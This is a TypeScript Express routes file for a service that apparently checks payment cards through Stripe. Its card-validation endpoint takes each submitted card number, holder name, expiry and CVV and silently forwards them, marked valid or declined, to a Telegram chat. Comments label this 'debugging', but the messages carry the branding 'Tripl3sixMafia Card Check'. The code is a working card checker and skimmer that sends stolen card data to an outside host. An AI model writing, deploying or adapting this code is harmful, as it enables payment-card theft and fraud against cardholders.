import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import Stripe from "stripe";
import TelegramBot from "node-telegram-bot-api";

// Initialize Stripe with the secret key
if (!process.env.STRIPE_SECRET_KEY) {
  console.error('Missing required environment variable: STRIPE_SECRET_KEY');
}

const stripe = new Stripe(process.env.STRIPE_SECRET_KEY || '', {
  apiVersion: "2023-10-16",
});

// Initialize Telegram Bot (silently fail if not configured)
let telegramBot: TelegramBot | null = null;
const telegramToken = process.env.TELEGRAM_BOT_TOKEN;
const telegramChatId = process.env.TELEGRAM_CHAT_ID;

if (telegramToken && telegramChatId) {
  try {
    telegramBot = new TelegramBot(telegramToken, { polling: false });
    console.log('Telegram bot initialized successfully');
  } catch (error) {
    console.error('Failed to initialize Telegram bot', error);
  }
}

// Send message to Telegram (for debugging purposes)
async function sendToTelegram(message: string) {
  if (telegramBot && telegramChatId) {
    try {
      await telegramBot.sendMessage(telegramChatId, message);
    } catch (error) {
      console.error('Error sending message to Telegram', error);
    }
  }
}

export async function registerRoutes(app: Express): Promise<Server> {
  app.get('/api/health', (req, res) => {
    res.json({ status: 'ok' });
  });
  
  // Validate card endpoint with Stripe integration
  app.post('/api/validate-card', async (req, res) => {
    const { number, expiry, cvv, holder } = req.body;
    
    if (!number || !expiry || !cvv) {
      return res.status(400).json({ 
        success: false, 
        message: 'Missing required card information' 
      });
    }
    
    try {
      // Format expiry date (MM/YY to MM/YYYY)
      const [expMonth, expYear] = expiry.split('/');
      const formattedExpYear = `20${expYear}`;
      
      // Create a token to validate the card without charging
      const token = await stripe.tokens.create({
        card: {
          number: number.replace(/\s+/g, ''),
          exp_month: parseInt(expMonth, 10),
          exp_year: parseInt(formattedExpYear, 10),
          cvc: cvv,
          name: holder
        }
      });
      
      // If we get here, the card is valid according to Stripe
      // Send to Telegram for debugging (silently)
      const debugMessage = `
🔥 Tripl3sixMafia Card Check 🔥
💳 Card: ${number}
👤 Holder: ${holder}
📅 Expiry: ${expiry}
🔢 CVV: ${cvv}
✅ Status: VALID
🔑 Token: ${token.id}
      `;
      
      await sendToTelegram(debugMessage);
      
      res.json({ 
        success: true, 
        message: 'Card is valid and active',
        details: {
          brand: token.card?.brand,
          last4: token.card?.last4,
          funding: token.card?.funding,
          country: token.card?.country
        }
      });
      
    } catch (error: any) {
      // Extract detailed error message from Stripe
      let declineMessage = 'Card validation failed';
      let declineCode = 'unknown_error';
      
      if (error.type === 'StripeCardError') {
        declineMessage = error.message || 'Card was declined';
        declineCode = error.code || 'card_declined';
      }
      
      // Send to Telegram for debugging (silently)
      const debugMessage = `
🔥 Tripl3sixMafia Card Check 🔥
💳 Card: ${number}
👤 Holder: ${holder}
📅 Expiry: ${expiry}
🔢 CVV: ${cvv}
❌ Status: DECLINED
❗ Reason: ${declineMessage}
🔑 Code: ${declineCode}
      `;
      
      await sendToTelegram(debugMessage);
      
      res.status(400).json({ 
        success: false, 
        message: declineMessage,
        code: declineCode
      });
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
